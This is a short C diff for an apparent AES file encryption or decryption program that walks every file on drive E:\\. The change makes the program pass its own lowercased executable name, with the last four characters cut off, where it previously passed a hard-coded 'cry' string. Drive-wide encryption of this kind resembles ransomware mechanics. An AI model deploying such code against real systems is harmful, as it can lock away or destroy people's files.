@@ -4,6 +4,7 @@ struct FileInfo {
    char name[FILENAME_SIZE];
 };
 
+void toLower(char* str);
 int dir_exists(const char *path);
 int file_exists(const char *filename);
 void endeda(int mode, const char* path_old, char* path_new, const char* fname, int key);
@@ -29,12 +30,24 @@ int main(int argc, char *argv[])
 	
 	struct AES_ctx ctx;
 	
+	argv[0][strlen(argv[0]) - 4] = 0;
+	toLower(argv[0]);
+	
 	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
 	strcpy(path, "E:\\");
-	processFilesRecursively(&ctx, mode, path, "cry");
+	processFilesRecursively(&ctx, mode, path, argv[0]);
 	free(path);
 	
 	return EXIT_SUCCESS;
+}
+
+void toLower(char* str)
+{
+	for(int i=0; i<=strlen(str); i++)
+	{
+      if(str[i]>=65 && str[i]<=90)
+         str[i]=str[i]+32;
+	}
 }
 
 /**
